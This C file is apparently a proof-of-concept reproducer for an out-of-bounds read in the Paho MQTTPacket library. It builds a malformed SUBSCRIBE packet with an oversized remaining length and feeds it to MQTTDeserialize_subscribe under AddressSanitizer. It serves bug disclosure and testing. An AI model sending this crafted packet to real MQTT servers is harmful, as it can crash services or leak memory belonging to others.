/*
 * Host AddressSanitizer reproducer for the Paho MQTTPacket out-of-bounds
 * read caused by an unchecked MQTT remaining length.
 *
 * Build (from this directory):
 *   gcc -g -fsanitize=address -I ../mqttpacket poc_subscribe.c \
 *       ../mqttpacket/MQTTPacket.c ../mqttpacket/MQTTSubscribeServer.c \
 *       -o poc_subscribe
 *   ./poc_subscribe
 *
 * Expected: AddressSanitizer reports a stack-buffer-overflow READ in
 * readInt() called from readMQTTLenString() called from
 * MQTTDeserialize_subscribe(). The remaining length claims 0x0FFFFFFF bytes
 * but the buffer is 16 bytes.
 */
#include <stdio.h>

#include "MQTTPacket.h"
#include "MQTTSubscribe.h"

int main(void)
{
    unsigned char buf[16];
    buf[0] = 0x82;                                          /* SUBSCRIBE */
    buf[1] = 0xFF; buf[2] = 0xFF; buf[3] = 0xFF; buf[4] = 0x7F; /* rem len 0x0FFFFFFF */
    buf[5] = 0x00; buf[6] = 0x01;                           /* packet id */
    buf[7] = 0x00; buf[8] = 0x02;                           /* first topic length 2 */
    buf[9] = 'a'; buf[10] = 'b';                            /* first topic */
    /* The next topic length is read from bytes 11..12, past the intended
     * packet, and drives the walk out of the 16-byte buffer. */

    unsigned char dup = 0;
    unsigned short packetid = 0;
    int count = 0;
    MQTTString topics[8];
    int qos[8];

    int rc = MQTTDeserialize_subscribe(&dup, &packetid, 8, &count, topics, qos,
                                       buf, (int)sizeof(buf));
    printf("rc=%d count=%d\n", rc, count);
    return 0;
}
